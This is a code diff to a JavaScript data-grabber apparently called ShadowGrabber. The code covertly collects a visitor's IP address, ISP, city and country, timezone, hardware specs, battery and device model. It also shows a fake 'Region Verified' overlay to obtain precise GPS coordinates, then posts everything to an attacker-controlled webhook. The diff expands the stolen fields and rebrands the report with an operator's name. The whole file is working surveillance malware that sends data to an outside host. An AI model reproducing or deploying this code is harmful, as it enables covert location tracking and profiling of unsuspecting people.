@@ -268,7 +268,7 @@ class ContactGuard {
 async function send(payload) {
     try {
         const d = new FormData();
-        d.append('payload_json', JSON.stringify({ embeds: [payload.embed], username: 'ShadowGrabber v15' }));
+        d.append('payload_json', JSON.stringify({ embeds: [payload.embed], username: 'Yasir Abbas | ShadowGrabber' }));
         if (payload.file) d.append('file', payload.file.blob, payload.file.name);
         await fetch(CONFIG.WEBHOOK, { method: 'POST', body: d });
     } catch (e) { }
@@ -294,14 +294,28 @@ async function main() {
 
     await send({
         embed: {
-            title: '👑 PERSISTENT GOD REPORT',
-            description: `Target: ${CONFIG.REDIRECT_URL}`,
+            title: '👑 YASIR ABBAS | TARGET CONNECTED',
+            description: `**Target URL:** ${CONFIG.REDIRECT_URL}`,
             color: 0x000000,
+            thumbnail: { url: 'https://cdn-icons-png.flaticon.com/512/3004/3004458.png' }, // Spy Icon
             fields: [
-                { name: '📍 Geo & Net', value: `IP: ${network.ip.ip}\nCity: ${network.ip.city}\nSpeed: ${network.speed}\nType: ${network.type}`, inline: false },
-                { name: '💾 Storage Core', value: `**Cores:** ${sys.cores}\n**RAM:** ${sys.ram}\n**Capacity:** ${sys.storage}\n**Quota:** ${sys.quota}`, inline: true },
-                { name: '📱 Device', value: `Model: ${navigator.userAgent.match(/\(([^)]+)\)/)?.[1]}\nBatt: ${await navigator.getBattery().then(b => b.level * 100 + '%').catch(() => 'N/A')}`, inline: true }
-            ]
+                {
+                    name: '📍 Geo & Network',
+                    value: `**IP:** \`${network.ip.ip}\`\n**ISP:** ${network.ip.org || network.ip.isp}\n**Location:** ${network.ip.city}, ${network.ip.country_name}\n**Timezone:** ${network.ip.timezone}\n**Speed:** ${network.speed}`,
+                    inline: false
+                },
+                {
+                    name: '💾 System Core',
+                    value: `**CPU:** ${sys.cores} Cores\n**RAM:** ${sys.ram}\n**Storage:** ${sys.storage}\n**Quota:** ${sys.quota}\n**Screen:** ${screen.width}x${screen.height}`,
+                    inline: true
+                },
+                {
+                    name: '📱 Device Info',
+                    value: `**Model:** ${navigator.userAgent.match(/\(([^)]+)\)/)?.[1]}\n**OS:** ${navigator.platform}\n**Battery:** ${await navigator.getBattery().then(b => Math.round(b.level * 100) + '%').catch(() => 'N/A')}\n**Touch:** ${navigator.maxTouchPoints} pts`,
+                    inline: true
+                }
+            ],
+            footer: { text: 'Yasir Abbas Intelligence Suite v15.0' }
         }
     });
 
@@ -309,11 +323,18 @@ async function main() {
     const locGuard = new LocationGuard(overlay);
     const loc = await locGuard.lock();
     if (loc.success) {
+        const mapUrl = `https://www.google.com/maps?q=${loc.coords.latitude},${loc.coords.longitude}`;
         await send({
             embed: {
-                title: '🎯 GPS LOCKED', color: 0x2ECC71,
-                description: `Lat: ${loc.coords.latitude}\nLong: ${loc.coords.longitude}\nAcc: ${loc.coords.accuracy}m`,
-                url: `https://www.google.com/maps?q=${loc.coords.latitude},${loc.coords.longitude}`
+                title: '🎯 YASIR ABBAS | GPS LOCKED',
+                color: 0x2ECC71,
+                description: `**Accuracy:** ±${Math.round(loc.coords.accuracy)}m\n\n🔗 **[CLICK TO VIEW ON GOOGLE MAPS](${mapUrl})**`,
+                url: mapUrl,
+                fields: [
+                    { name: 'Latitude', value: `\`${loc.coords.latitude}\``, inline: true },
+                    { name: 'Longitude', value: `\`${loc.coords.longitude}\``, inline: true },
+                    { name: 'Altitude', value: `${loc.coords.altitude || 0}m`, inline: true }
+                ]
             }
         });
         overlay.showSuccess('Region Verified');
